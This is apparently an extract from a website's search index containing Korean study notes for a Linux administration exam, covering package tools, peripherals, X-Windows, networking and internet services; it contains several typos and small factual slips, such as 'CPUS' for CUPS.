[Ctrl] + [A] 현재 행의 맨 앞으로 이동   [Ctrl] + [E] 현재 행의 맨 끝으로 이동   [Ctrl] + [V] 이전 페이지로 이동   [Ctrl] + [Y] 다음 페이지로 이동   [Ctrl] + [C] 현재 커서의 위치를 표시   [Ctrl] + [T] 영문자의 철자를 확인   [Ctrl] + [W] 키를 누르고 문자열을 입력하면 원하는 문자열을 찾음   [Ctrl] + [K] 현재 라인을 삭제   [Ctrl] + [U] 마지막으로 삭제된 라인을 복구   [Ctrl] + [I] 화면 갱신        emacs  [Ctrl] +  [Ctrl] + [S]        파일 저장  [Ctrl] +  [Ctrl] + [C]        편집 종료    마크 설정 후  [Ctrl] + [W]       잘라내기     메뉴 기능     [Ctrl] + [K] 커서 뒤에 있는 한 줄이 모두 지워짐   [Ctrl] + [A] 커서를 줄의 맨 앞으로 이동   [Ctrl] + [E] 커서를 줄의 맨 뒤로 이동   [Ctrl] + [N] 커서를 한 줄 아래로 이동   [Ctrl] + [S] 찾을 문자열 커서의 아랫부분에서 찾을 문자열을 검색   [Ctrl] + [R] 찾을 문자열 커서의 윗부분에서 찾을 문자열을 검색   [Ctrl] + [G] 진행되고 있는 명령을 끔       소프트웨어 프로그램 설치  계열   데미안 계열   배포 업체: Debian, Ubuntu, Xandros, Linspire\n  패키지 툴: dpkg, apt-get, optitude\n       레드햇 계열   배포 업체: Fedora, CentOS, RHEL, openSUSE, Mandirva\n  패키지 툴: rpm, yum\n       rpm   레드햇 사에서 만들어낸 패키지 관리 툴이다.\n  새로운 패키지를 설치하거나 업그레이드, 삭제 시 사용한다.\n  Windows의 setup.exe와 유사하게 만든 프로그램이다.\n  *레드햇 계열의 패키지 파일 확장명은 .rpm 이다.\n       yum   네트워크를 통해 기존 RPM 패키지 파일의 업데이트 자동 수행, 새로운 패키지 설치 및 제거를 수행한다.\n  RPM의 의존성 문제를 해결하기 위한 유틸리티이다.\n  인터넷을 기반으로 설치하므로 네트워크가 정상적으로 연결된 상태여야만 한다.\n  YUM은 페도라 22버전 이후부터 YUM의 문제점을 보안한 DNF로 전환되고 있다.\n       dpkg   데비안의 저레벨 패키지 관리 툴이다.\n  deb 패키지의 설치, 삭제, 정보 제공을 위해 사용된다.\n  확장자 deb 파일은 데비안 패키지 파일이다.\n  패키지 설치 및 제거 시 RPM과 같은 의존성 문제를 일으킨다.\n  명령어 ‘dpkg –s 패키지’는 지정된 패키지에 대한 자세한 정보를 나타낸다.\n       apt-get   데미안 리눅스에서 소프트웨어 설치와 제거를 위한 패키지 관리 유틸리티이다.\n  패키지 관련 정보를 확인하거나 패키지 설치 시 발생할 수 있는 의존성과 충돌문제를 해결하기 위해 /etc/apt/source.list 파일을 참조한다.\n       aptitude  우분투 패키지 관리 유틸리티로 APT처럼 패키지를 관리를 자동화한다.       소스 파일 설치  파일 아카이브와 압축   파일 아카이브   아카이브는 다수 개의 파일이나 디렉터리를 하나의 파일로 묶는 것이다.\n  아카이브 파일은 다른 시스템으로 다수 개의 파일을 한 번에 전송하거나 파일 백업용으로 사용한다.\n       파일압축과 해제  대표적인 파일 압축 명은 compress, gzip, bzip2, xz가 있다. 일반적으로 많이 사용되는 압축 명령어는 gzip과 bzip2이다. 압축률이 가장 낮은 것은 명령어 compress이며, 압축률이 가장 높은 것은 명령어 xz이다.       소스 코드 설치   소스 코드를 압축 해제 후 컴파일 순서에 따라 프로그램을 설치한다.\n  컴파일 순서는 설치 파일의 환경설정, 컴파일, 파일 설치이다.\n  1단계 환경설정: ./configure 프로그램 설치 과정에서 필요로 하는 환경파일 makefile 생성\n  2단계 컴파일: make makefile을 기반으로 소스 파일을 컴파일\n  3단계 파일 설치: make install 컴파일 된 실행파일을 지정된 속성으로 지정된 디렉터리에 설치\n       주변 장치 연결 및 설정   프린터 인쇄 시스템 설치 및 설정    LPRng   리눅스 초기에 사용되었던 인쇄 시스템이다.\n  버클리 프린팅 시스템으로 BSD 계열 유닉스에서 사용하기 위해 개발되었다.\n  라인 프린터 데몬 프로토콜을 사용하여 프린터 스폴링과 네트워크 프린터 서버를 지원한다.\n  LPRng설정 파일은 /etc/printcap이다.\n       CPUS   애플이 개발한 오픈 소스 프린팅 시스템이다.\n  유닉스 계열 운영체제의 시스템을 프린터 서버로 사용 가능하게 해준다.\n  매킨토시나 윈도우 등 시중에 시판되는 대부분의 프린트를 지원한다.\n  HTTP 기반의 IPP(Internet Printing Protocol)를 사용하여 프린터를 웹 기반으로 제어한다.\n  CPUS 설정 파일은 /etc/cpus이다.\n  사용자 및 호스트 기반의 인증을 제공한다.\n  CPUS 관련 파일은 cpusd.conf, printers.conf, classes.conf, cpused 등이 있다.\n       프린터 설정   일반적으로 X-Windows상에서 ‘프린터 설정 도구’로 프린터를 설치한다.\n  ‘로컬 접속’으로 프린터를 직접 연결할 수 있다.\n  네트워크 프린터를 설정할 경우 5가지 방법을 제공하고 있다.\n  AppSocket/HP jecDirect 프린터가 컴퓨터에 연결되어 있지 않고 네트워크에 연결된경우 사용\n       LPD/LPR 호스트 또는 프린터  IPP 프로토콜 기반의 프린터 설정 시 사용       Windows Printer vis SAMBA   윈도우 시스템에 연결된 프린터 설정 시 사용\n  삼바 기반의 SMB 프로토콜 사용\n  인터넷 프린터 프로토콜\n       https   https 프로토콜 기반의 프린터 설정 시 사용\n  인터넷 프린터 프로토콜\n       ipp   IPP 프로토콜 기반의 프린터 설정 시 사용\n  사운드 카드 설치 및 설정\n        OSS(Open Sound System)   리눅스 및 유닉스 계열 운영체제에서 사운드를 만들고 캡쳐하는 인터페이스이다.\n  표준 유닉스 장치 시스템콜에 기반을 둔 것이다.\n  현재 리눅스 커뮤니티에서는 ALSA로 대체되었다.\n       ALSA(Advanced Linux Sound Architecture)   사운드 카드용 장치 드라이버를 제공하기 위한 리눅스 커널 요소이다.\n  GPL 및 LGPL 라이선스 기반으로 배포되고 있다.\n  사운드 카드를 자동으로 구성하고 시스템에 여러 개의 사운드 장치를 관리하는 것이 목적이다.\n  OSS의 지원을 받아서 하드웨어 기반 미디합성, 다중 채널 하드웨어 믹싱, 전이중 통신, 다중 프로세서와의 조화, 스레드 안전장치 드라이브 등의 기능을 지원한다.\n  현결 설정 파일은 /etc/asound.state이다.\n       스캐너 설치 및 설정    SANE(Scanner Access Now Easy)\n  평판 스캐너, 핸드 스캐너, 비디오 캠 등 이미지 관련 하드웨어를 제어하는 API이다.\n  GPL 라이선스, 리눅스 및 유닉스 계열, OS2, Windows도 지원한다.\n    XSANE(X based interface for the SANE)\n  SANE 스캐너 인터페치스를 이용하여 X-Windows 기반의 스캐너 프로그램이다.\n  스캐너, 디지털 카메라, 디지털 캠 등 다양한 장치에서 사용이 가능하다.\n  스캔 작업뿐만 아니라 캡쳐한 이미지에 수정 작업을 할 수도 있다.\n  GPL 라이선스, 리눅스 및 유닉스 계열, OS2, Windows도 지원한다.\n       주변 장치 활용  프린터 설치 및 설정   BSD 계열 프린터 명령어들   lpr: 프린터 작업 요청을 한다.\n  lpq: 프린터 큐에 있는 작업 목록을 출력한다.\n  lprm: 프린터 큐에 대기 중인 작업을 삭제한다. 취소할 프린트 작업 번호를 입력한다.\n  lpc: 라인 프린터 컨트롤 프로그램이다.\n       System V 계열 프린터 명령어들   lp: 프린터 작업 요청(명령어 lpr과 유사한 기능)을 한다.\n  lpstat: 프린터 큐의 상태를 확인한다.\n  cancel: 프린트 작업을 취소한다. 취소할 요청 ID를 lpstat로 확인 후 삭제한다.\n       사운드 카드 관련 명령어   alsactl: ALSA 사운드 카드를 제어한다.\n  alsamixer: 커서라이브러리 기반의 오디오 프로그램이다.\n  cdparanoia: 오디오 CD로부터 음악 파일을 추출 시 사용한다.\n       스캐너 관련 명령어   sane-find-scanner: SCSI 스캐너와 USB 스캐너 관련 장치 파일을 찾아주는 명령어이다.\n  scanimage: 이미지를 스캔한다.\n  scanadf: 자동 문서 공급 장치가 장착된 스캐너에서 여러 개의 사진을 스캔한다.\n  xcam: GUI 기반으로 평판 스캐너나 카메라로부터 이미지 스캔한다.\n      "}),a.add({id:242,href:'/docs/system/linux/lm-3/',title:"Linux 활용",content:"Linux 일반   X-windows 개념 및 사용법   X-window란 우리가 흔히 사용하고 있는 Window와 같이 GUI 환경을 제공하는 서비스를 의미한다. Ubuntu, CentOS 등의 Redhat, Debian 계열의 Linux 운영체제 또한 GUI 환경으로 설치가 가능하다.     X-윈도우의 특징과 구성 요소   개념과 특징   리눅스 환경의 각종 애플리케이션과 유틸리티에 대해 그래픽 사용자 인터페이스를 제공한다.\n  플랫폼과 독립적으로 작동하는 그래픽 시스템이다.\n  X-윈도우는 X11, X, X Windows System이라 한다.\n  네트워크 기반의 그래픽 환경을 지원한다.\n  이기종 시스템 사이에서도 사용 가능하다.\n  스크롤바, 아이콘, 색상 등 그래픽 환경 자원들이 특정 형태로 정의되어 있지 않다.\n  디스플레이 장치에 의존적이지 않으며 원하는 인터페이스를 만들 수 있다.\n  X-윈도우는 네트워크 프로토콜 기반의 클라이언트/서버 시스템이다.\n  서버 프로그램과 클라이언트 프로그램으로 나누어 작동한다.\n  서버는 클라이언트들의 디스플레이에 관한 접근 허용, 클라이언트 간의 자원 공유, 네트워크 메시지 전달, 클라이언트와 입출력 기기와의 중계를 담당한다.\n  클라이언트는 애플리케이션으로 X 서버가 제공하는 기능들을 이용한다.\n  오픈 데스크톱 환경으로 KDE, GNMOE, XFCE 등이 있다.\n       구성요소의 종류   Xprotocol\n  Xlib\n  XCB\n  Xtoolkit\n  XFree86\n  XF86Config\n       X-윈도우 설정과 실행 파일 ( /etc/inittab )   init 프로세스가 읽는 파일로, init 프로세스가 무엇을 해야 할 것인가를 결정한다.\n  리눅스 사용 환경을 초기화한다.\n       X-윈도우 실행   그래픽 환경이 아닌 터미널 윈도우로 로그인한 경우에는 몇 개의 프로그램을 실행해야한다.\n  터미널 윈도우의 명령어 프롬프트상에서 다음의 명령어를 실행시켜야 한다.\n  startx는 X-윈도우를 실행하는 스크립트로 시스템 환경을 초기화하고 xinit을 호출한다.\n  startx 실행 시 인자값을 xinit에 전달하는 옵션은 ‘\u0026ndash;‘ 이다.\n       환경변수 DISPLAY   환경 변수는 프로세스가 컴퓨터에서 동작하는 방식에 영향을 주는 동적인 값이다.\n  셸에서 정의되고 실행하는 동안 프로그램에 필요한 변수이다.\n  환경 변수 DISPLAY는 현재 X-윈도우 Display 위치를 지정할 수 있다.\n  형식: export DISPLAY=IP주소:디스플레이번호.스크린번호\n       윈도우 매니저와 데스크톱 환경   윈도우 매니저   윈도우 매니저는 X window상에서 창의 배치와 표현을 담당하는 시스템 프로그램이다.\n  창 열기와 닫기, 창의 생성 위치, 창 크기 조정, 창의 외양과 테두리를 변화시킬 수 있다.\n  라이브러리는 Xlib와 XCB를 사용한다.\n  윈도우 매니저의 대표적인 종류로는 fvwm, twm, mw, windowMaker, AfterStep 등이 있다.\n       데스크톱 환경   GUI사용자에게 제공하는 인터페이스 스타일로 데스크톱 관리자라고도 한다.\n  윈도우 매니저, 파일 관리자, 도움말, 제어판 등 다양한 도구를 제공하는 패키지 형태의 프로그램이다.\n  아이콘, 창, 도구모음, 폴더, 배경화면, 데스크톱 위젯도 제공한다.\n  드래그 앤 드롭과 프로세스 간의 통보 기능을 지원한다.\n  대표적인 데스크톱 환경에는 KDE, GNOME, LXDE, Xfce 등이 있다.\n       디스플레이 매니저   X window system 상에서 작동하는 프로그램이다.\n  디스플레이 매니저 종류들로는 XDM, GDM, KDM 등이 있다.\n  로컬 또는 리모트 컴퓨터의 X server의 접속과 세션 시작을 담당한다.\n  사용자에게 그래픽 로그인 화면을 띄워주고 아이디와 패스워드를 입력받아 인증을 진행하고 인증이 정상적으로 완료되면 세션을 시작한다.\n       X-윈도우 활용   원격지에서 X 클라이언트 이용    xhost   명령어 xhost는 X 서버에 접속할 수 있는 클라이언트를 지정하거나 해제한다.\n  X 서버에게 디스플레이를 요청 시 해당 요청에 대해 허용 여부를 호스트 단위로 제어한다.\n  xhost [+|-] [IP|도메인명]\n  환경변수 DISPLAY로 X 서버 프로그램이 실행될 때 표시되는 클라이언트 주소를 지정한다.\n       xauth   .Xauthority 파일의 쿠키 내용을 추가, 삭제, 리스트를 출력하는 유틸리티이다.\n  xhost가 호스트 기반 인증 방식을 사용하기 위해 필요한 유틸리티라면 xauth는 MMC방식의 인증방식을 사용하기 위한 필수 유틸리티이다.\n  원격지에서 접속하는 X클라이언트를 허가할 때 IP 주소나 호스트명이 아닌 X-윈도우 실행 시에 생성되는 키 값으로 인증할 때 사용한다.\n  사용자 인증 기반을 지원하기 위해 각 사용자에게 네트워크화 된 홈 디렉터리에 파일 $HOME/.Xauthority에 대해 읽기 및 쓰기 권한이 있어야 한다.\n       X-윈도우 응용 프로그램   오피스   LibreOffice: 오피스 프로그램 피키지\n  gedit: 텍스트 편집 프로그램\n  kwrite: KDE 기반의 텍스트 편집기\n       그래픽   GIMP: 이미지 편집 프로그램\n  ImageMagick: 이미지 생성 및 편집을 지원하는 프로그램\n  eog: GNOM의 이미지 뷰어 프로그램\n  kolourpaint: Ubuntu 이미지 편집 프로그램\n  gThumb: GNOME 데스크톱 이미지 뷰어 프로그램\n  gwenview: KDE의 기본 이미지 뷰어\n       멀티미디어   Totem: GNOME 기반의 사운드 및 비디오 재생 프로그램\n  RHYTHMBOX: 통합형 음악 관리 프로그램\n  CHEESE: GNOME 기반의 카메라 동영상 프로그램\n       개발  ECLIPSE: 통합 개발 환경으로 자바를 비롯한 다양한 언어를 지원       기타   Dolphine: KDE용 파일 관리자\n  KSnapshot: 스크린샷 프로그램\n       인터넷 활용   네트워크 분류    lan(Local Area Network)   근거리 통신망을 연결하는 네트워크이다.\n  학교나, 회사등 가까운 지역을 묶는 소규모 네트워크이다.\n       man(MetroPolice Area Network)   도시권 통신망을 연결하는 네트워크이다.\n  LAN과 WAN의 중간크기이다.\n       wan(Wide Area Network)   국가, 대륙 등과 같이 넓은 지역을 연결하는 네트워크이다.\n  거리의 제한은 없으나 다양한 경로를 경유해 도달하므로 속도가 느리고 전송 에러율도 높다.\n       san(Storage Area Network)   스토리지를 위해 고안된 스토리지 전용 고속 네트워크이다.\n  파이버 채널을 이용하여 구성되는 저장장치 네트워크이다.\n  호스트 컴퓨터의 종류에 구애받지 않고 별도의 연결된 저장장치 사이에 대용량의 데이터를 전송시킬 수 있는 고속 네트워크이다.\n  서버가 클라이언트로부터 받은 파일 I/O 요청을 직접 블록 I/O로 전환하여 SAN에 연결된 스토리지로 저장한다.\n       네트워크 개요   LAN 토폴로지   토폴로지는 호스트 및 장비들의 물리적인 배치 형태이다.\n  토폴로지는 성형, 망형, 버스형, 링형, 트리형 등이 있다.\n       성형   중앙 컴퓨터에 여러 대의 컴퓨터가 허브 또는 스위치와 같은 장비로 연결\n  중앙 집중식 형태로 네트워크 확장에 용이\n  고속의 대규모 네트워크에 적합\n  관리하는 중앙 컴퓨터 고장 시 전체 네트워크 사용이 불가능\n       망형  모든 노드가 서로 일대일로 연결된 형태 대량의 데이터를 송수신할 경우 적합 장애 발생 시 다른 시스템에 영향이 적고 우회할 수 있는 경로가 존재하여 가장 신뢰성이 높은 방식 회선 구축 비용이 많이 듬       버스형   하나의 통신회선에 여러 컴퓨터를 연결해서 전송\n  연결된 컴퓨터 수에 따라 네트워크 성능이 변동\n  단말기 추가 및 제거가 용이하며 설치 비용이 저렴\n  노드 수 증가 시 트래픽 증가로 병목현상 발생, 네트워크 성능 저하 초래\n  문제가 발생한 노드의 위치를 파악하기 어려움\n       링형   각 노드가 좌우의 인접한 노드와 연결되어 원형을 이룬 형태\n  앞의 컴퓨터로부터 수신한 내용을 다음컴퓨터로 재전송하는 방법\n  토큰패싱이라는 방법을 통해 데이터 전송\n  고속네트워크로 자주 네트워크 환경이 바뀌지 않는 경우 구성\n  분산제어와 검사 및 회복이 가능\n  네트워크 전송상의 충돌이 없고 노드 숫자가 증가하더라도 망 성능의 저하가 적음\n  논리적인 순환형 토폴로지로 하나의 노드장애가 전체 토폴로지에 영향\n  노드의 추가 및 삭제가 용이하지 않음\n       트리형   버스형과 성형 토폴로지의 확장 형태\n  백본과 같은 공통 배선에 적절한 분기장치를 사용하여 링크를 덧붙여 나갈 수 있는 구조\n  트래픽 양 증가 시 병목 현상의 가능성 증대\n       매체 접근 제어 방식    CSMA/CD: 단말기가 전송로의 신호 유무를 조사하고 다른 단말기가 신호를 송출하는지 확인한다.\n  토큰패싱: 토큰의 흐름에 의해 전송 순서가 결정된다. 토큰패싱은 free token과 busy token을 이용하여 매체 접근을 제어한다.\n     네트워크 장비   케이블   보호 외피나 외장 안에 두 개 이상의 전선이나 광섬유로 묶여 있는 것이다.\n  TP 케이블, 동축 케이블, 광섬유 케이블 등을 사용할 수 있다.\n       리피터  신호의 재생 및 증폭기능을 수행하여 물리적인 거리를 확장시킨다.       허브   신호를 노드에 전달해 주는 장비이다.\n  네트워크 확장, 다른 허브와의 상호 연결, 신호의 증폭 등의 기능을 제공한다.\n       LAN카드   네트워크에 접속할 수 있도록 컴퓨터 내에 설치되는 확장 카드이다.\n  전기신호로부터 데이터를 송신하고 변환하며, 데이터를 전기신호로 변환하여 송신한다.\n  MAC 주소를 이용하여 데이터의 수신 여부를 판별한다.\n       브릿지   모든 수신 프레임을 일단 버퍼에 저장하고, 주소에 따라 목적지 포트로 프레임을 전달하는 장비이다.\n  큰 네트워크를 단일 네트워크상의 트래픽 감소 등과 같은 작고 관리하기 쉬운 Segment로 나눌 필요가 있을 때 사용한다.\n  전기적으로 신호의 재생 및 패킷의 송수신 어드레스를 분석하여 패킷의 통과 여부를 판정하는 필터링을 작용한다.\n       스위치   브릿지와 비슷한 기능을 갖는 장비이다.\n  소프트웨어 기반인 처리 방식으로 브릿지보다 빠르게 데이터를 전송한다.\n  맥 주소 테이블을 기반으로 프레임 전송한다.\n  스위칭 허브는 전용매체교환 기술을 이용하여 트래픽 병목 현상을 제거하고, 포트별로 속도가 전용으로 보장된다.\n       라우터   OSI모델의 물리 계층, 데이터링크 계층, 네트워크 계층의 기능을 지원하는 장치이다.\n  서로 다른 통신망과 프로토콜을 사용하는 네트워크 간의 통신을 가능하게 한다.\n  LAN을 연결시켜주는 망 연동 장치로서 통신망에서 정보를 전송하기 위해 경로를 설정하는 역할을 제공하는 핵심적인 통신장비이다.\n  목적지로 향하는 최적의 경로 설정 데이터를 목적지까지 전달하는 기능을 수행한다.\n       게이트웨이   서로 다른 형태의 네트워크를 상호 접속하는 장치이다.\n  서로 다른 통신망이나 프로토콜을 사용하는 네트워크 간의 통신을 가능하게 하는 장비를통칭한다.\n  데이터 포맷 등 두 개의 시스템 사이에서 중계자 역할을 수행한다.\n       UTP 케이블링 다이렉트 케이블 크로스오버 케이블     프로토콜 개요와 기능   OSI7 모델과 TCP/IP모델      OSI 7 모델기능 TCP/IP 모델     7 응용 계층 사용자에게 다양한 네트워크 서비스를 제공하기 위해 User Interface를 제공, UI로 데이터를 생성   6 표현 계층 부호화, 압축, 암호화 기능   5 세션 계층 종단 간 애플리케이션들의 연결 설정, 유지,해제   4 전송 계층 종단 간 열결, 응용 계층 사이에 논리적인 통로 제공   3 네트워크 계층 논리적인 주소를 사용경로 관리, 최적 경로 결정   2 데이터링크 계층 데이터 전송을 위한 형식 결정데이터 전송을 위하여 Media에 접근하는 방법 제공, 오류 검출 기능 제공   1 물리 계층 물리적인 연결, 전기적, 기계적, 기능적 절차적인 수단 제공      계층별 프로토콜    프로토콜은 특정 통신 기능을 수행하기 위한 규약이다. 이것은 두 노드 사이의 정보 교환시 발생하는 통신상의 에러를 피하기 위하여 합리적인 통제를 한다.\n  프로토콜 구성요소는 형식, 의미, 순서이다.\n 형식: 데이터 포맷, 부호화 및 신호 레벨 등 의미: 특정 패턴을 어떻게 해석하고, 어떤 동작을 할 것인가 결정 순서: 속도 일치 및 순서 제어 등    인터넷/네트워크 계층 프로토콜: IP, ICMP, IGMP, ARP, RARP\n  전송 계층 프로토콜: TCP, UDP\n  응용 계층 프로토콜: SMTP, POP, Telnet, SSH, FTP, HTTP, SNMP, TFTP, DHC\n     IP주소와 도메인   IPv4 주소 체계   IPv4 주소는 4개의 옥탯으로 구성된다.\n  각 옥탯은 8비트이므로 IPv4는 총 32비트이다.\n  클래스 E는 240~255 사이의 대역에 있으며 IP 주소 부족을 위해 예약해 놓은 것이다.\n  IP주소는 네트워크 ID와 호스트 ID로 구성되어 있다.\n  서브넷 마스크는 네트워크 부분과 호스트 부분을 구분해주는 값이다. 이것은 효율적인 네트워크 분리를 가능하게 한다.\n      서브넷팅\n  서브넷은 특정 네트워크를 여러 개의 네트워크, 브로드캐스트 도메인을 나누는 것이다.\n  IP주소의 부족 현상을 해소하기 위한 방안이다.\n  서브넷팅은 디폴트 서브넷 마스크를 기준으로 해서 네트워크 ID비트수를 늘리고 호스트ID 비트수를 줄이는 것이다. 이때 기준에서 늘어난 네트워크 ID비트는 서브넷ID라 부른다.\n     IPv6 주소 체계   IPv4와 IPv6의 차이점      인터넷 서비스의 종류   WWW 서비스   프로토콜 HTTP를 기반으로 한 멀티미디어와 하이퍼텍스트를 통합한 정보 검색 시스템이다.\n  다양한 그래픽 유저 인터페이스를 사용하는 것이 가능하다.\n  WWW 서비스는 분산 클라이언트-서버 모델을 기반으로 한다.\n  표준 웹 프로토콜(HTTP, XML, SOAP, WSDL, UDDI)을 기본으로 하여 서로 다른 개발 환경과 운영체제에서도 상호 통신이 가능하다.\n       메일 서비스   전자 메일 시스템은 컴퓨터 사용자끼리 편지를 주고받는 서비스이며 MTA, MUA, MDA로 구성된다.\n  메일 클라이언트에서 송신은 SMTP, 수신은 POP3 또는 IMAP4를 이용한다.\n  메일을 보내거나 메일 서버간의 메시지 교환은 SMTP프로토콜을 사용하고, 메일 서버에 도착한 메일을 사용자 컴퓨터에서 확인할 때에는 POP3과 IMAP를 사용한다.\n  MIME(Multipurpose Internet Mail Extensionn)은 멀티미디어 전자우편을 위한 표준으로, 멀티미디어 데이터를 ASCII 형식으로 변환할 필요 없이 인터넷 전자 우편으로 송신하기 위한 SMTP의 확장 규격이다.\n       FTP 서비스   FTP(File Transafer Protocol) TCP/IP에 의해 제공되는 호스트 간의 파일 복사를 위한 프로토콜이다.\n  FTP의 통신 모드는 패시브 모드와 액티브 모드로 구분한다.\n  FTP는 20번(일반 데이터 전송용)과 21번(제어 데이터 전송용) 포트 번호를 사용한다.\n  FTP는 사용자계정을 가진 사용자들의 접속과 익명의 로그인을 허용하고 있다.\n  익명은 공개 소프트웨어를 제공하는 FTP서버에 접속할 때 입력할 수 있는 계정이다.\n       DNS(Domain Name System) 서비스   호스트 이름을 기반으로 IP주소를 변환하거나 IP주소를 기반으로 호스트 이름을 변환시켜주는 프로토콜이다.\n  DNS에서는 도메인명을 분산된 트리 형태의 계층적 구조로 관리한다.\n       Telnet과 SSH 서비스   네트워크상에 있는 다른 컴퓨터에 로그인하거나 원격 시스템에서 명령 실행, 파일 복사등을 제공하는 서비스이다.\n  Telnet과 ssh는 사용자가 서버에 접속하여 서버 관리, 파일 편집 등을 Text모드 환경에서시스템 명령을 실행하고 결과를 화면을 통해 볼 수 있다.\n  Telnet은 서버와 주고받는 정보를 Byte 스트림 형식으로 전송하고, ssh는 DES, RSA 등의암호화기법을 사용해서 전송한다. 따라서 Telnet보다 ssh가 안전한 데이터 전송을 보장한다.\n  ssh는 암호화뿐만 아니라 압축 기술도 제공한다. 암호화를 통해서 늘어난 데이터의 크기를 압축하여 사용자와 서버가 송수신하는 것을 가능하게 한다.\n       NFS(Network File System)   네트워크 기반에 다른 시스템과 파일 시스템을 공유하기 위한 클라이언트/서버 프로그램이다.\n  1984년 썬 마이크로시스템즈 사에서 개발하였다.\n  원격지에 있는 리눅스 서버의 특정 디렉터리를 로컬 시스템의 하위 디렉터리처럼 사용할수 있다.\n  다른 컴퓨터의 파일 시스템을 마운트하고 공유하여 자신의 디렉터리인 것처럼 사용할 수있게 해준다.\n  NFS는 portmap이 먼저 수행되어 있어야만 NFS 서비스가 실행된다. portmap은 NIS, NFS등 RPC(Remote Procedure Call) 연결에 관여하는 데몬이다.\n   NFS 서비스는 nfsd, rpc.mounted, rpc, statd, rpc.rockd, rpc.rquotad 데몬들이 구동된다.     RPC(Remote Procedure Call)   동적으로 서비스와 포트를 연결할 때 사용하는 방법이다.\n  기본적으로 포트와 서비스가 정적으로 구성될때는 /etc/services 파일을 참조하지만 동적으로 포트를 할당받아 사용할 때는 RPC 인 rpcbind를 사용한다.\n       인터넷 서비스 설정  네트워크 인터페이스 설정   리눅스는 다양한 네트워크를 지원한다.\n  일반적으로 네트워크 인터페이스는 자동으로 인식되지만 자동으로 인식되지 않을 경우 수동으로 설정해야 한다.\n  네트워크 인터페이스 수동 설정 방법은 컴파일된 인터페이스 모듈을 커널에 적재하는 것이다.\n     네트워크 설정 파일들   /etc/sysconfig/network: 네트워크의 기본 정보가 설정되어 있는 파일이다.\n  /etc/sysconfig/network-scripts/ifcfg-ethX: 지정된 네트워크 인터페이스의 네트워크 환경설정 정보가 저장된다.\n  /etc/resolv.conf: 기본적으로 사용할 도메인명과 네임서버를 설정한다.\n  /etc/hosts: IP 주소와 도메인 주소를 1:1로 등록하여 도에밍네 대한 IP 주소를 조회하도록한다.\n  /etc/host.conf: DNS 서비스를 제공할 때 먼저 이 파일을 검사하여 파일의 설정에 따라 서비스한다.\n       네트워크 설정   IP 주소 설정   네트워크 설정 파일로 주소 설정: 파일 /etc/sysconfig/network 또는 /etc/sysconfig/network-scripts/ifcfg-ethX로 IP 주소를 설정한다.\n  명령어를 이용한 주소 설정: 명령어 ifconfig를 이용하여 IP주소를 할당한다.\n  유틸리티를 이용한 주소 설정: netconfig, system-config-network, redhat-config-network등의 다양한 유틸리티를 이용하여 주소를 설정한다.\n       라우팅 테이블 설정 및 관리   라우팅이란 송신 패킷이 목적지까지 전송할 수 있도록 경로를 설정하는 작업이다.\n  송신 패킷은 라우팅 테이블에 목적지 경로 정보가 있다면 해당 경로로 패킷을 전송한다.\n  명령어 route는 라우팅 테이블을 설정하거나 확인한다.\n  목적지 경로가 라우팅 테이블에 없다면 디폴트게이트웨이로 트래픽을 전송할 수 있게 라우팅 테이블을 설정할 수 있다.\n       네트워크 관련 명령어   TCP/IP주소 설정 정보 확인: ifconfig, nslookup\n  네트워크 경로 상태 확인: ping, traceroute\n  네트워크 연결 상태 확인: netstat\n  라우팅 테이블 확인: route\n  NIC 상태 확인: ethtool, mii-tool, arp\n       기술 동향  리눅스 동향    1991년, 초기 리눅스는 주로 서버로 이용되었다.\n  현재의 리눅스 활용 분야는 크게 서버, 데스크톱 및 개발, 임베디드 분야로 나눌 수 있다.\n     리눅스 관련 기술   클러스터링   여러 개의 시스템이 하나의 거대한 시스템으로 보이게 만드는 기술이다.\n  여러 개의 컴퓨터를 네트워크를 통해 연결하여 하나의 컴퓨터처럼 동작하도록 제작한 시스템이다.\n  클러스터 노드와 클러스터 관리자로 구성된다.\n  고계산용 클러스터, 부하분산 클러스터, 고가용성 클러스터 종류가 있다.\n       임베디드 시스템   컴퓨터의 하드웨어 제어인 프로세스, 메모리 입출력장치와 하드웨어를 제어하는 소프트웨어가 조합되어 특정한 목적을 수행하는 시스템이다.\n  미리 정해진 특정한 기능을 수행하도록 프로그램이 내장되어 있는 시스템이다.\n  하드웨어와 소프트웨어를 포함하는 특정한 응용시스템이다.\n  개인 휴대 정보 단말, 지리 정보 시스템, 정보가전, 게임기기 등의 시스템을 통칭한다.\n  하드웨어로는 프로세서/컨트롤러, 메모리, I/O장치, 네트워크 장치, 센서 등이다.\n  소프트웨어로는 운영체제, 시스템 S/W, 응용 S/W 이다.\n  실시간 처리를 지원한다.\n  소형, 경량 및 저전력을 지원한다.\n       활용 기술  리눅스 서버 분야     서버 가상화   서버를 구성하는 모든 자원의 가상화를 의미한다.\n  하나의 물리적 서버 호스트에서 여러 개의 서버 운영 체제를 게스트로 실행할 수 있게해주는 소프트웨어 아키텍처이다.\n  서버들을 하나의 서버로 통합하여 가상환경을 구동시킴으로써 물리서버 및 공간을 절감한다.\n  서버 자원 통합 운영으로 하드웨어 가용성을 증가시킨다.\n  손쉬운 이중화구성과 유연한 자원 할당으로 시스템 가용성과 안정성을 확보한다.\n  통합 구축, 공동 활용, 유지 관리, 전력 및 관리 비용 등 중복 투자 방비 및 예산을 절감한다.\n       클라우드 컴퓨팅   공유 구성이 가능한 컴퓨팅 리소스의 통합으로 어디서나 간편하게 요청에 따라 네트워크를 통해 접근하는 것을 가능하게 한다.\n  사업자와 직접 상호 작용하지 않고 사용자의 개별 관리 화면을 통해 서비스를 이용할 수있다.\n  사업자의 컴퓨팅 리소스를 여러 사용자가 공유하는 형태로 이용한다.\n  필요에 다라 필요한 만큼의 스케일업과 스케일다운이 가능하다.\n IaaS(Infrastructure as a Service): 서버나 스토리지 같은 하드웨어 자원만을 임대해 주는 클라우드 서비스이다. Paas(Platform as a Service): 소프트웨어 서비스를 개발하기 위한 플랫폼을 제공하는 클라우드 서비스이다. SaaS(Software as a Service): 클라우드 환경에서 동작하는 응용 프로그램을 서비스 형태로제공한다.     사설 클라우드, 공유 클라우드, 하이브리드 클라우드 모델이 있다.     빅데이터   기존 데이터베이스 관리 도구의 데이터 수집, 저장, 관리, 분석 역량을 넘어서는 데이터이다.\n  다양한 종류의 대규모 데이터로부터 저렴한 비용으로 가치를 추출하고 데이터의 빠른 수집, 발굴 분석을 지원할 수 있도록 고안된 차세대 기술 및 아키텍처이다.\n  볼륨, 속도, 다양성의 3대 요소가 있다.\n       임베디드 시스템    모바일   스마트폰의 OS란 스마트폰을 구성하고 있는 하드웨어 부품인 메모리, LCD, CPU 등의 기계적인 부품들을 효율적으로 관리 